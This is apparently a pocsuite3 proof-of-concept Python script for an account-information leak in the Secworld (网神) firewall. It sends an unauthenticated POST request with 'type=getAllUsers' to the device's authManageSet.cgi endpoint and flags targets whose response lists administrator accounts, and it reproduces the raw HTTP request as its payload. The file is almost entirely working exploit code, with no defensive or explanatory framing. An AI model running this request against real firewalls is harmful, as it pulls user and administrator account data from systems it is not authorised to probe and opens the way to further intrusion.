# _*_ coding:utf-8 _*_
# @Time : 2023/12/12 20:07
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import time

class secworld(POCBase):
    pocDesc = ''' 网神防火墙账号信息泄露漏洞'''
    vulID = '20231212'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-12'
    createDate = '2023-12-12'
    updateDate = '2023-12-12'
    name = ' 网神防火墙账号信息泄露漏洞'
    appName = '网神防火墙'



    def _verify(self):

        result = {}
        path = '/cgi-bin/authUser/authManageSet.cgi'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = """type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"""
        payload = """
        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
        Host: ip:port
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 77

        type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
        """
        url = self.url + path
        try:
            respnose = requests.post(url, headers=headers, data=data, verify=False)

            if respnose.status_code == 200 and '管理员' in respnose.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(secworld)